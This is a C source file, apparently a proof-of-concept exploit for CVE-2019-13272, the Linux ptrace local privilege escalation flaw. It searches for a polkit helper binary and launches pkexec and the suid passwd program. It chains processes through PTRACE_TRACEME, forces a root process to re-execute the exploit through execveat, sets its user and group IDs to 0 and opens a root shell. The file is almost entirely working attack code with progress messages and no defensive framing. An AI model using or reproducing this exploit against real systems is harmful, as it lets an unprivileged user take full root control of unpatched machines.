#define _GNU_SOURCE
#include <fcntl.h>
#include <linux/elf.h>
#include <pthread.h>
#include <pwd.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <syscall.h>
#include <unistd.h>

static char *helper_list[] = 
{
    "/usr/lib/gnome-settings-daemon/gsd-backlight-helper",
    "/usr/lib/gnome-settings-daemon/gsd-wacom-led-helper",
    "/usr/lib/unity-settings-daemon/usd-backlight-helper",
    "/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper",
    "/usr/sbin/mate-power-backlight-helper",
    "/usr/bin/xfpm-power-backlight-helper",
    "/usr/bin/lxqt-backlight_backend",
    "/usr/libexec/gsd-wacom-led-helper",
    "/usr/libexec/gsd-wacom-oled-helper",
    "/usr/libexec/gsd-backlight-helper",
    "/usr/lib/gsd-backlight-helper",
    "/usr/lib/gsd-wacom-led-helper",
    "/usr/lib/gsd-wacom-oled-helper",
};
static char *helper = NULL;
static char *helper_basename = NULL;
static int pipe_for_block[2];
static int self_fd;
pid_t pid_task_b;
pid_t pid_task_c;

char* findHelper(void);
int middleStage(void);
int middlePtracee(void);
int finalPtracee(void);
int getRootShell(void);
void forceChildToExecve(pid_t child_pid, int exec_fd, char *argv);

char* findHelper(void)
{
    struct stat buf;
    
    for (int i = 0; i < sizeof(helper_list) / sizeof(char*); i++)
    {
        if (!stat(helper_list[i], &buf))
            return helper_list[i];
    }

    return NULL;
}

// task B
int middlePtracee(void)
{
    self_fd = open("/proc/self/exe", O_RDONLY);
    struct passwd *pw = getpwuid(getuid());
    pid_task_b = getpid();

    pid_task_c = fork();
    if (!pid_task_c) {
        return finalPtracee();
    }
    
    fputs("[+] Task B fork out task C.\n", stderr);
    fputs("[*] Task B execve pkexec soooon...\n", stderr);
    dup2(self_fd, 0); // got stdin close
    dup2(pipe_for_block[1], 1); // redirect stdout to block it
    execl("/usr/bin/pkexec", basename("/usr/bin/pkexec"), "--user",
          pw->pw_name, helper, "--helper", NULL);

    // if we arrive there, we failed.
    fputs("[x] Failed to execve pkexec!", stderr);
    return -1;
}

// task again B
int middleStage(void)
{
    pid_t child = waitpid(-1, NULL, 0);
    forceChildToExecve(child, 114, "stage3");
    return 0;
}

// task C
int finalPtracee(void)
{
    pid_task_c = getpid();
    char buf[0x1000];
    char needle[0x100];
    char uid_buf[0x100];
    int task_B_status_fd;

    sprintf(needle, "/proc/%d/status", pid_task_b);
    sprintf(uid_buf, "Uid:\t%d\t0\t", getuid());
    dup2(self_fd, 114);
    task_B_status_fd = open(needle, O_RDONLY);
    if (task_B_status_fd < 0) {
        fputs("[x] Failed to get status of task B!", stderr);
        exit(EXIT_FAILURE);
    }

    // check out uid of task B
    while (1) {
        buf[pread(task_B_status_fd, buf, 0x1000 - 1, 0)] = '\0';
        if (strstr(buf, uid_buf)) // task B got root
            break;
    }

    // let task B(root) be ptracer
    puts("[+] Task B is root now!");
    ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    puts("[*] Task C execve another suid programme sooooon...");
    execl("/usr/bin/passwd", "passwd", NULL);

    // if we arrived there, execve failed 
    puts("[x] Task C failed to execve!");
}

// task again C
int getRootShell(void)
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    return system("/bin/sh");
}

// force a child to execve by ptrace through execveat syscall
void forceChildToExecve(pid_t child_pid, int exec_fd, char *argv)
{
    struct user_regs_struct regs;
    struct iovec iov = {
        .iov_base = &regs,
        .iov_len = sizeof(regs),
    };
    size_t child_stack;
    size_t insert_data[0x100];

    ptrace(PTRACE_SYSCALL, child_pid, 0, NULL); // wait for child meeting a syscall
    waitpid(child_pid, NULL, 0);    // wait for child to execve
    ptrace(PTRACE_GETREGSET, child_pid, NT_PRSTATUS, &iov); // get env of child
    
    // prepare the stack data
    child_stack = (regs.rsp - 0x1000) & ~0xfffUL; 
    memset(insert_data, 0, sizeof(insert_data));
    int idx = 0;
    insert_data[idx++] = child_stack + 0x18;    // argv arrays
    insert_data[idx++] = 0;
    insert_data[idx++] = 0;                     // env arrays
    insert_data[idx++] = *(size_t*)argv;          // argv[0]
    insert_data[idx++] = 0;                     // path

    // copy to child stack
    for (int i = 0; i < idx; i++) {
        ptrace(PTRACE_POKETEXT, child_pid, child_stack + i * sizeof(size_t),
               insert_data[i]);
    }

    // execveat(exec_fd, NULL, argv, NULL, flags)
    regs.orig_rax = __NR_execveat;
    regs.rdi = exec_fd;
    regs.rsi = child_stack + 0x20;  // path -> NULL
    regs.rdx = child_stack;         // argv -> "stagex", NULL
    regs.r10 = child_stack + 0x10;  // envp -> NULL
    regs.r8  = AT_EMPTY_PATH;       // flags

    ptrace(PTRACE_SETREGSET, child_pid, NT_PRSTATUS, &iov);
    ptrace(PTRACE_DETACH, child_pid, 0, NULL);
    waitpid(child_pid, NULL, 0);
}

// mainly for task a, and jmp for stage 2 and 3
int main(int argc, char ** argv)
{
    char buf[0x1000];

    if (!strcmp(argv[0], "stage2")) {
        return middleStage();
    }
    else if (!strcmp(argv[0], "stage3")) {
        return getRootShell();
    }

    puts("[+] CVE-2019-13272 POC of local privileged.");
    puts("[+] Written by arttnba3.");
    puts("[*] Start exploiting...");

    // find the helper
    puts("[*] Finding the helper...");
    helper = findHelper();
    helper_basename = basename(helper);
    if (!helper) {
        fprintf(stderr, "[x] Unable to find suitable helper in your env!\n");
        exit(EXIT_FAILURE);
    }
    printf("[*] Using helper: %s\n", helper);

    // create the pipe for blocking child

    // set the pipe in packet mode, which meant that the data 
    // should be received in packets 
    pipe2(pipe_for_block, O_DIRECT | O_CLOEXEC); 
    fcntl(pipe_for_block[0], F_SETPIPE_SZ, 0x1000);
    /**
     * temp packet to make the following ones stuck,
     * the stdout of task B will be redirect to it
     */
    write(pipe_for_block[1], "arttnba3", 8);

    // fork out task B
    // two kinds of writing, all OK
    // pid_task_b = clone(middlePtracee,(size_t)malloc(0x1000 * 100)+0x1000*100,
    //                    CLONE_VM | CLONE_VFORK | SIGCHLD, NULL);
    pid_task_b = fork();
    if (!pid_task_b) {
        middlePtracee();
        return 0;
    }

    sprintf(buf, "/proc/%d/comm", pid_task_b);
    while (1) {
        char comm[0x100];
        int comm_fd = open(buf, O_RDONLY);
        if (comm_fd < 0) {
            fprintf(stderr, "[x] Failed to read comm of task B!\n");
            exit(EXIT_FAILURE);
        }
        comm[read(comm_fd, comm, 0x100 - 1)] = '\0';
        if (!strncmp(comm, helper_basename, 10)) {
            break;
        }
        usleep(100000);
    }

    // task B got the root, wait a while it'll lose privilege,
    // then task A attach to it
    puts("[*] Task A attaching to task B soooon...");
    ptrace(PTRACE_ATTACH, pid_task_b, 0, NULL);
    waitpid(pid_task_b, NULL, 0); // 0 means no extra options

    // force the task B to execve stage2
    puts("[*] Forcing task B to execve stage2...");
    forceChildToExecve(pid_task_b, 0, "stage2");
    //force_exec_and_wait(pid_task_b, 0, "stage2");
    exit(EXIT_SUCCESS);
}
